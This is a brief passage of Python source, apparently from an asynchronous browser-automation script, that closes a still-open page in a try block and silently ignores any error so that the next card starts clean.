        # card is closed so the next one starts clean.
        try:
            if page is not None and not page.is_closed():
                await page.close()
        except Exception:
            pass
